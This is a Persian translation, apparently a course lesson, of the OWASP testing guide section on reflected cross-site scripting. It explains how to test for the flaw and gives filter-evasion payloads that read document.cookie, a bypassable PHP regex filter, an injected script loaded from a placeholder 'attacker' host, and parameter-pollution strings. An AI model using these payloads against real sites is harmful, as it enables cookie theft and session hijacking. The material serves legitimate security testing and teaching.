<div dir="rtl">
<img src="https://github.com/BugHunter021/penetration-test/blob/main/learn/persian/WSTG-INVP/leeson-1/images/owasp-WSTG-INVP-01.jpg" align="center" >

# درس اول

## بررسی Reflected Cross Site Scripting

در این بخش از دوره آموزشی OWASP-WSTG به هفتمین بخش از استاندارد WSTG با شناسه WSTG-INPV-01 می پردازیم که مربوط به بررسی Reflected Cross Site Scripting می باشد.

## خلاصه

زمانی که یک مهاجم، کد اجرایی مرورگر را در یک پاسخ HTTP تزریق می‌کند، Cross Site Scripting یا XSS رخ می‌دهد. حمله تزریق‌شده در خود برنامه ذخیره نمی‌شود. این رویکرد پایدار نیست (non-persistent) و تنها بر کاربرانی تاثیر می‌گذارد که یک لینک مخرب یا صفحه وب شخص ثالث را باز می‌کنند. رشته حمله به عنوان بخشی از پارامترهای URI یا HTTP ایجاد شده در نظر گرفته می‌شود که این رشته‌ها به طور نامناسب توسط برنامه پردازش می‌شوند و به قربانی باز می‌گردد.

<div dir="rtl">
Reflected XSS رایج‌ترین نوع از حملات XSS است. حملات Reflected XSSنیز به عنوان حملات non-persistent XSS شناخته می‌شوند و از آنجا که پیلود حمله از طریق یک درخواست و پاسخ واحد تحویل و اجرا می‌شود، به آن‌ها به عنوان Type 1 XSS یا first-order نیز اشاره می‌شود.

<div dir="rtl">
زمانی که یک برنامه کاربردی وب نسبت به این نوع حمله آسیب‌پذیر است، ورودی تایید نشده ارسال‌شده از طریق درخواست‌ها را به کلاینت ارسال می‌کند. روش متداول حمله شامل یک مرحله طراحی است که در آن مهاجم یک URL ایجاد و آزمایش می‌کند، سپس شامل یک مرحله مهندسی اجتماعی نیز می شود که نفوذگر در آن قربانیان خود را متقاعد می‌کند تا به این URL در مرورگر خود مراجعه کنند و سپس مرحله پایانی که شامل اجرای نهایی کد مخرب است با استفاده از مرورگر قربانی انجام می گردد.

<div dir="rtl">
به طور معمول کد مهاجم به زبان JavaScript نوشته می‌شود، اما دیگر زبان‌های نوشتار نیز مانند ActionScript و VBScript در این زمینه استفاده می‌شوند. حمله کنندگان معمولا از این آسیب‌پذیری‌ها برای نصب کیلاگر، سرقت کوکی‌های قربانی، سرقت clipboard و تغییر محتوای صفحه استفاده می‌کنند.

<div dir="rtl">
یکی از مشکلات اصلی در جلوگیری از آسیب‌پذیری‌های XSS، کدگذاری مناسب کاراکتر یا Character Encoding است. در برخی موارد، سرور وب یا برنامه کاربردی وب نمی‌توانند برخی از کدگذاری‌های کاراکترها را فیلتر کنند، بنابراین، برای مثال، برنامه کاربردی وب ممکن است تگ اسکریپت را فیلتر کند، اما ممکن است با قرار دادن %3c و %3e در ابتدا و انتهای عبارت script (معادل تگ باز و بسته) را فیلتر نکند.

## اهداف تست

• متغیرهایی که در پاسخ‌ها منعکس می‌شوند را شناسایی کنید.
• ورودی مورد قبول آن‌ها و کدگذاری که برای آن اعمال می‌شود را ارزیابی کنید (‏در صورت وجود)‏.

## چگونه تست را انجام دهیم
**آزمایش جعبه سیاه**

یک تست جعبه سیاه حداقل شامل سه مرحله است:

<div dir="rtl">
1. Detect Input Vectors

ورودی های موجود را تشخیص دهید. تست نفوذگر باید تمام متغیرهای تعریف‌شده توسط کاربر برنامه وب و چگونگی ورود آن‌ها را برای هر صفحه وب شناسایی کند. این شامل ورودی‌های پنهان یا غیر آشکار مانند پارامترهایHTTP، داده‌هایPOST، مقادیر فیلدهای فرم پنهان و مقادیر از پیش تعریف‌شدهRadio یا Selection است. به طور معمول از ویرایشگرهای HTML در مرورگر یا پروکسی های وب برای مشاهده این متغیرهای پنهان استفاده می‌شود.

<div dir="rtl">
2. Analyze Input Vectors

هر ورودی را برای شناسایی آسیب‌پذیری‌های بالقوه بررسی نمایید. برای تشخیص آسیب‌پذیری XSS، تست نفوذگر معمولا از داده‌های ورودی ویژه ساخته‌شده با هر ورودی استفاده می‌کند. چنین داده‌های ورودی معمولا بی‌ضرر هستند، اما پاسخ هایی را از مرورگر وب ایجاد می کنند که آسیب پذیری را نشان می دهد. داده‌های مورد نیاز جهت آزمایش را می‌توان با استفاده از یک برنامه Fuzzer مربوط به برنامه کاربردی وب، یک لیست خودکار از پیش تعریف‌شده از رشته‌های حمله شناخته‌شده یا به صورت دستی تولید کرد. برخی از 
  نمونه‌های این داده‌های ورودی به شرح زیر هستند:
<div dir="ltr">
  
![XSS](https://github.com/BugHunter021/penetration-test/blob/main/learn/persian/lesson-1/img/WSTG-INPV-01-01.png)
<div dir="rtl">
برای یک لیست جامع از رشته‌های آزمایشی بالقوه به لینک زیر مراجعه نمایید:
</div>
https://owasp.org/www-community/xss-filter-evasion-cheatsheet


<div dir="rtl">
3. Check Impact

برای هر ورودی آزمون در مرحله قبل، تست نفوذگر نتیجه را تحلیل می‌کند و تعیین می‌کند که آیا یک آسیب‌پذیری را نشان می‌دهد که تاثیر واقعی بر امنیت برنامه کاربردی وب داشته باشد یا خیر. این امر نیازمند بررسی صفحه وب HTML حاصل و جستجو برای ورودی آزمون است. در صورت تشخیص آسیب‌پذیری، تست نفوذگر هر کاراکتر خاصی را شناسایی می‌کند که به درستی کدگذاری، جایگزین یا فیلتر نشده باشد. مجموعه کاراکترهای خاص آسیب‌پذیر فیلترنشده به زمینه (Context) آن بخش از HTML بستگی خواهد داشت.

در حالت ایده‌آل همه کاراکترهای ویژه HTML با HTML Entities جایگزین خواهند شد. Entity های کلیدی HTML که باید شناسایی شوند عبارتند از:
<div dir="ltr">

![XSS](https://github.com/BugHunter021/penetration-test/blob/main/learn/persian/lesson-1/img/WSTG-INPV-01-02.png)
<div dir="rtl">

با این حال، یک لیست کامل از موجودیت‌ها با مشخصات HTML و XML تعریف شده است که در لینک زیر قابل مشاهده می باشد:

https://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references

در چارچوب یک اقدام HTML یا کد جاوا اسکریپت، مجموعه متفاوتی از کاراکترهای خاص هست که باید Escape شده، کدگذاری، جایگزین یا فیلتر شوند. این کاراکترها عبارتند از:
<div dir="ltr">

![XSS](https://github.com/BugHunter021/penetration-test/blob/main/learn/persian/lesson-1/img/WSTG-INPV-01-03.png)
<div dir="rtl">

برای یک مرجع کامل‌تر، به راهنمای JavaScript مربوط به موزیلا در لینک زیر مراجعه نمایید.

[راهنمای جاوا اسکریپت](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Grammar_and_types#using_special_characters_in_strings)



## مثال یک

به عنوان مثال، سایتی را در نظر بگیرید که یک اعلان Welcome %username%و یک لینک دانلود دارد.
<div dir="ltr">

![XSS](https://github.com/BugHunter021/penetration-test/blob/main/learn/persian/lesson-1/img/WSTG-INPV-01-04.png)
<div dir="rtl">

تست نفوذگر باید شک کند که هر نقطه ورود داده می‌تواند منجر به حمله XSS شود. برای تجزیه و تحلیل آن، وی با متغیر کاربر بازی می‌کند و سعی می‌کند آسیب‌پذیری را شناسایی کند.

بیایید روی لینک زیر کلیک کنیم و ببینیم چه اتفاقی می‌افتد:
<div dir="ltr">

![XSS](https://github.com/BugHunter021/penetration-test/blob/main/learn/persian/lesson-1/img/WSTG-INPV-01-05.png)
<div dir="rtl">

اگر هیچ Sanitization اعمال نشده باشد، این امر منجر به popup زیر خواهد شد:
<div dir="ltr">

![XSS](https://github.com/BugHunter021/penetration-test/blob/main/learn/persian/lesson-1/img/WSTG-INPV-01-06.png)
<div dir="rtl">
این نشان می‌دهد که یک آسیب‌پذیری XSS وجود دارد و به نظر می‌رسد که تست نفوذگر می‌تواند کد انتخاب خود را در مرورگر هر کسی که بر روی این لینک کلیک می‌کند، اجرا نماید.

## مثال دو

بیایید بخش دیگری از کد (‏لینک)‏ را امتحان کنیم:
<div dir="ltr">

![XSS](https://github.com/BugHunter021/penetration-test/blob/main/learn/persian/lesson-1/img/WSTG-INPV-01-07.png)
<div dir="rtl">
این امر رفتار زیر را ایجاد می‌کند:
<div dir="ltr">

![XSS](https://github.com/BugHunter021/penetration-test/blob/main/learn/persian/lesson-1/img/WSTG-INPV-01-08.png)
<div dir="rtl">
این باعث می‌شود کاربر با کلیک بر روی پیوند ارائه شده توسط آزمایشگر، فایل malicious.exe را از سایتی که تحت کنترل خود است دانلود کند.

<div dir="rtl">

## توضیح Bypass XSS Filters

برنامه‌های تحت وب می‌توانند با بررسی ورودی‌ها و پاک‌سازی آن‌ها (Sanitization) از بروز حملات Reflected XSS جلوگیری کنند. همچنین یک فایروال تحت وب یا مکانیزم‌های تعبیه‌شده در مرورگرهای وب مدرن، جلوی ورودی مخرب را می‌گیرند.


تست نفوذگر باید آسیب‌پذیری‌ها را با فرض اینکه مرورگرهای وب از حمله جلوگیری نمی‌کنند، آزمایش کند. ممکن است که مرورگرها به روز نباشند یا ویژگی‌های امنیتی داخلی آن‌ها از کار افتاده باشد. به طور مشابه، فایروال‌های تحت وب برای تشخیص حملات جدید و ناشناخته تضمین نشده اند. یک مهاجم می‌تواند یک رشته حمله را ایجاد کند که توسط فایروال برنامه وب شناسایی نشده است.


بنابراین، اکثر پیشگیری های مربوط به آسیب‌پذیری XSS باید به پاک‌سازی داده‌های ورودی کاربر از برنامه‌های کاربردی وب بستگی داشته باشد. مکانیسم‌های متعددی برای توسعه دهندگان برای پاک‌سازی وجود دارد، مانند بازگرداندن یک خطا، حذف، رمزگذاری، یا جایگزین کردن ورودی نامعتبر. ابزاری که برنامه با آن ورودی نامعتبر را شناسایی و تصحیح می‌کند، یکی دیگر از ضعف‌های اصلی در جلوگیری از XSS است. یک لیست ممنوعه (Deny List) ممکن است شامل تمام رشته‌های حمله احتمالی نباشد، یک لیست مجاز ممکن است بیش از حد مجاز باشد، پاک‌سازی ممکن است با شکست مواجه شود یا یک نوع ورودی ممکن است به اشتباه مورد اعتماد قرار گیرد و Unsanitized باقی بماند. همه این موارد به مهاجمان اجازه می‌دهند تا فیلترهای XSS را دور بزنند.

در لینک زیر می‌توانید برخی از روش‌های رایج جهت عبور از فیلترهای XSS را مشاهده نمایید:

https://owasp.org/www-community/xss-filter-evasion-cheatsheet

## مثال سه: Tag Attribute Value

از آنجا که این فیلترها براساس یک لیست انکار هستند، نمی‌توانند هر نوعی از عبارات را مسدود کنند. در واقع، مواردی وجود دارد که در آن یک اکسپلویت XSS را می توان بدون استفاده از تگ اسکریپت و حتی بدون استفاده از کاراکترهایی مانند > و < که معمولا فیلتر می‌شوند، انجام داد.
برای مثال، برنامه کاربردی وب می‌تواند از مقدار ورودی کاربر برای پر کردن یک Attribute استفاده کند، همانطور که در کد زیر نشان‌داده شده‌است:

```js
<input type="text" name="state" value="INPUT_FROM_USER"> 
```

سپس مهاجم می‌تواند کد زیر را ارسال کند:
```js
" onfocus="alert(document.cookie) 
```

## مثال چهار: Different Syntax or Encoding

در برخی موارد این احتمال وجود دارد که فیلترهای مبتنی بر امضا را بتوان به سادگی با مبهم کردن حمله شکست داد. به طور معمول شما می‌توانید این کار را از طریق درج تغییرات غیر منتظره در Syntax یا در Encoding انجام دهید. این تغییرات توسط مرورگرها به عنوان HTML معتبر زمانی که کد برگشت داده می‌شود، پذیرفته شده و در عین حال آن‌ها می‌توانند توسط فیلتر نیز پذیرفته شوند.

به مثال‌های زیر توجه نمایید:
```js
"><script >alert(document.cookie)</script >
"><ScRiPt>alert(document.cookie)</ScRiPt> 
"%3cscript%3ealert(document.cookie)%3c/script%3e 
 
```

## مثال پنج: Bypassing Non-Recursive Filtering

گاهی اوقات، فرآیند Sanitization تنها یک‌بار به کار برده می‌شود و به صورت بازگشتی اجرا نمی‌شود. در این حالت مهاجم می‌تواند فیلتر را با ارسال یک رشته حاوی تلاش‌های متعدد، مانند مثال زیر، شکست دهد:
```js
<src<script>ip>alert(document.cookie)</script> 
```

## مثال شش: Including External Script

حال فرض کنید که توسعه دهندگان سایت هدف، کد زیر را برای محافظت از ورودی در برابر وارد شدن اسکریپت‌های خارجی اجرا کرده‌اند:
```php
<?
$re = "/<script[^>]+src/i";

	if (preg_match($re, $_GET['var']))
	{
		echo "Filtered"; 
		Return;
	}
echo "Welcome ".$_GET['var']." !";
?>

 
```

جداسازی عبارت منظم بالا:
<div dir="ltr">

```
1. Check for a <script 
2. Check for a “ “ (white space) 
3. Any character but the character > for one or more occurrences 
4. Check for a src
```
<div dir="rtl">


این امر برای فیلتر کردن عباراتی که داخل تگ اسکریپت قرار داده می شوند مفید است. اما در این حالت، می‌توان با استفاده از کاراکتر در یک Attribute بین scritp و src مانند زیر، Sanitization را دور زد:
<div dir="ltr">

```
http://example/?var=<SCRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT>
```
<div dir="rtl">

این کار آسیب‌پذیری Reflected XSS که قبلا نشان‌داده‌شده بود را اکسپلویت می کند و از اجرای کد JavaScript ذخیره‌شده در وب سرور مهاجم را طوری اجرا می‌کند که گویی از وب‌سایت قربانی، سرچشمه می‌گیرد.

## مثال هفتم: HTTP Parameter Pollution (HPP)

روش دیگر برای دور زدن فیلترها، HTTP Parameter Pollution است. این تکنیک اولین بار توسط Stefano di Paola و Luca Carettoni در سال ۲۰۰۹ در کنفرانس OWASP لهستان ارائه شد. این تکنیک Evasion، شامل تقسیم یک بردار حمله بین پارامترهای چندگانه است که دارای یک نام می‌باشند. دستکاری مقدار هر پارامتر بستگی به این دارد که هر تکنولوژی وب چگونه این پارامترها را تجزیه می‌کند، بنابراین استفاده از این نوع Evasion، همیشه امکان پذیر نخواهد بود. اگر محیط تست شده مقادیر همه پارامترها با یک نام را ادغام کند، آنگاه یک مهاجم می‌تواند از این تکنیک به منظور دور زدن مکانیزم‌های امنیتی مبتنی بر الگوی استفاده کند.

حمله معمولی:
<div dir="ltr">

```
http://example/page.php?param=<script>[...]</script>

```
<div dir="rtl">

حمله با استفاده از HPP :
<div dir="ltr">

```
http://example/page.php?param=<script&param=>[...]</&param=script>
```
<div dir="rtl">

در نهایت، تجزیه و تحلیل پاسخ‌ها می‌تواند پیچیده شود. یک راه ساده برای انجام این کار، استفاده از کدی است که یک popup را باز می‌کند، مانند مثال ما. این به طور معمول نشان می‌دهد که یک مهاجم می‌تواند دلخواه JavaScript انتخابی خود را در مرورگرهای بازدید کننده اجرا کند.

## آزمایش جعبه خاکستری

تست جعبه خاکستری شبیه تست جعبه سیاه است. در آزمایش جعبه خاکستری، تست نفوذگر دارای دانش نسبی از برنامه است. در این مورد، اطلاعات مربوط به ورودی کاربر، اعتبارسنجی ورودی و اینکه چگونه ورودی کاربر به کاربر برگردانده می‌شود، ممکن است توسط وی شناخته شود.

اگر سورس کد در دسترس باشد (‏تست جعبه سفید)‏، تمام متغیرهای دریافتی از کاربران باید آنالیز شوند. علاوه بر این، تست نفوذگر باید هر روش Sanitization اجرا شده را تجزیه و تحلیل نموده تا تصمیم بگیرد که آیا می‌توان آن‌ها را دور زد یا خیر.

## ابزارهای کمکی

• PHP Charset Encoder(PCE)

• Hackvertor

• XSS-Proxy

• Ratproxy

• Burp Proxy

• OWASP Zed Attack Proxy (ZAP)

**منبع** :
https://securityworld.ir/wstg-inpv-01